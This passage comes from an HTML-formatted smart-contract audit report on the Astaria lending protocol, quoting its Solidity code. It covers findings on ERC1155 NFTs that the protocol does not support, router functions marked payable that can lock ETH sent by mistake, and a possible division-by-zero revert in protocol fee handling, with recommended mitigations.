class=\"mtk1\">()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>and in CollateralToken.sol the function onERC721Received hook, the code needs to transfer the NFT from collateralToken to clearing house.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"177\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">tokenId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However, there are popular NFT, that conform to ERC1155 standard,</p>\n<p><a href=\"https://etherscan.io/tokens-nft1155\">https://etherscan.io/tokens-nft1155</a></p>\n<p>which use safeTransferFrom in ERC1155 implementation and does not match ERC721 safeTransferFrom method call</p>\n<p><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d59306bd06a241083841c2e4a39db08e1f3722cc/contracts/token/ERC1155/ERC1155.sol#L114\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d59306bd06a241083841c2e4a39db08e1f3722cc/contracts/token/ERC1155/ERC1155.sol#L114</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"178\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-56\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-56\" aria-label=\"recommended mitigation steps 56 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol support ERC1155 transfer as well given the vast popular ERC1155 NFT in NFT community and NFT marketplace.</p>\n<h2 id=\"07-certain-function-should-not-be-marked-as-payable-otherwise-the-eth-that-mistakenly-sent-along-with-the-function-call-is-locked-in-the-contract\" style=\"position:relative;\"><a href=\"#07-certain-function-should-not-be-marked-as-payable-otherwise-the-eth-that-mistakenly-sent-along-with-the-function-call-is-locked-in-the-contract\" aria-label=\"07 certain function should not be marked as payable otherwise the eth that mistakenly sent along with the function call is locked in the contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/107\">[07] Certain function should not be marked as payable, otherwise the ETH that mistakenly sent along with the function call is locked in the contract</a></h2>\n<p>In AstariaRouter.sol deposit, mint, withdraw, redeem are payable</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"179\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC4626</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxAmountIn</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">validVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maxAmountIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC4626</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minSharesOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">validVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sharesOut</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minSharesOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC4626</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxSharesOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">validVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sharesOut</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maxSharesOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC4626</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minAmountOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">validVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minAmountOut</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The function pullToken is also marked as payable</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"180\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pullToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadRouterSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>These function only performs ERC20 token and are not designed to receive ETH.</p>\n<p>The ETH that mistakenly sent along with the function call is locked in the contract In AstariaRouter.sol.</p>\n<h3 id=\"recommended-mitigation-steps-57\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-57\" aria-label=\"recommended mitigation steps 57 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol remove the payable keywords for the above mentioned function.</p>\n<h2 id=\"08-transaction-revert-in-division-by-zero-error-when-handling-protocol-fee-if-the-feeto-address-is-set-but-sprotocolfeedenominator-is-not-set\" style=\"position:relative;\"><a href=\"#08-transaction-revert-in-division-by-zero-error-when-handling-protocol-fee-if-the-feeto-address-is-set-but-sprotocolfeedenominator-is-not-set\" aria-label=\"08 transaction revert in division by zero error when handling protocol fee if the feeto address is set but sprotocolfeedenominator is not set permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/101\">[08] Transaction revert in division by zero error when handling protocol fee if the feeTo address is set but <code>s.protocolFeeDenominator</code> is not set</a></h2>\n<p>In the VaultImplementation, function commitToLien is called for lifecycle of new loan origination.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"181\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">commitToLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IAstariaRouter.Commitment </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">whenNotPaused</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">, ILienToken.Stack[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payout</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_beforeCommitToLien</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slopeAddition</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">slopeAddition</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payout</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_requestLienAndIssuePayout</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_afterCommitToLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">slopeAddition</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>which calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"182\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">(</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">slopeAddition</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payout</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_requestLienAndIssuePayout</span><span 